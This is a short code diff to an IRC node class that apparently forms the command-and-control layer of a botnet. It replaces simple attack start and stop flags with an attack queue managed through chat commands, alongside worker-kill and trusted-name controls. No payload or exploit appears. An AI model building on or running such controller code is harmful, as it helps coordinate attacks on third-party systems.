@@ -38,8 +38,7 @@ class IRCNode(irctargetedsocket.IRCTargetedSocket):
 			"-k" : [], # Kill workers
 			"-s" : [], # Status,
 			"-T" : ["add", "remove", "list"], # Trusted Names
-			"--attack" : [], # attack
-			"--stop" : [] # Stop attack
+			"--attack" : ["add", "remove", "list", "start", "stop"] # Attack Queue
 		}
 
 		self.banner = [
@@ -179,14 +178,26 @@ class IRCNode(irctargetedsocket.IRCTargetedSocket):
 				self.listNames(target, "channels", self.getChannels())
 				self.listNames(target, "nodes", self.getNodeNames())
 
-			elif command[1] == "--stop":
-				pass
 
 			elif command[1] == "--attack":
-				# queue the attack
-				# set attacking flag
-				# run attack
-				self.getNotifier().publish(14, "", command[2:])
+				l = self.getAttackQueue()
+
+				if command[2] == "add":
+					self.getNotifier().publish(15, "", command[3:])
+					self.listNames(target, "attack_queue", l)
+
+				elif command[2] == "remove":
+					self.getNotifier().publish(16, "", command[3:])
+					self.listNames(target, "attack_queue", l)
+
+				elif command[2] == "list":
+					self.listNames(target, "attack_queue", l)
+
+				elif command[2] == "start":
+					self.getNotifier().publish(13, "", command[3:])
+
+				elif command[2] == "stop":
+					self.getNotifier().publish(14, "", command[3:])
 
 		else:
 			pass
